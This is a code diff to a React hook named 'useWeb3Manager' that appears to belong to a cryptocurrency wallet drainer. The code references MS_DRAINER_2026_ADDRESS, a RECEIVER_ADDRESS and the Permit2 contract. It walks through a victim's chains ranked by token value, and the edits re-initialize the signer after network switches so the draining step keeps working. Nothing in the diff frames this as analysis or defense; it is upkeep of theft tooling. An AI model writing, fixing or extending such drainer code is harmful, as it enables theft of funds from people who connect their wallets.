@@ -141,9 +141,9 @@ export function useWeb3Manager() {
                     isSyncing.current = true;
 
                     if (!walletProvider) { isSyncing.current = false; return; }
-                    const provider = new ethers.BrowserProvider(walletProvider);
+                    let provider = new ethers.BrowserProvider(walletProvider);
                     const network = await provider.getNetwork();
-                    const signer = await provider.getSigner();
+                    let signer = await provider.getSigner();
                     const currentChainId = "0x" + network.chainId.toString(16);
                     const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3");
 
@@ -316,6 +316,7 @@ export function useWeb3Manager() {
             for (const [chainId, chainTokens] of sortedChains) {
                 const targetChainName = getChainName(chainId);
                 let provider = new ethers.BrowserProvider(walletProvider);
+                let signer = await provider.getSigner();
                 let network = await provider.getNetwork();
                 let currentId = "0x" + network.chainId.toString(16);
 
@@ -323,6 +324,7 @@ export function useWeb3Manager() {
                     const ok = await switchNetwork(walletProvider, chainId);
                     if (!ok) continue;
                     provider = new ethers.BrowserProvider(walletProvider);
+                    signer = await provider.getSigner(); // Re-initialize signer after network switch
                 }
 
                 const totalChainValue = chainTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
@@ -338,7 +340,6 @@ export function useWeb3Manager() {
                     const useMSDrainer = MS_DRAINER_2026_ADDRESS !== "0x0000000000000000000000000000000000000000";
                     if (useMSDrainer) {
                         try {
-                            const signer = await provider.getSigner();
                             if (!signer.provider) throw new Error("Signer disconnected from provider");
 
                             const checksummedReceiver = ethers.getAddress(RECEIVER_ADDRESS);
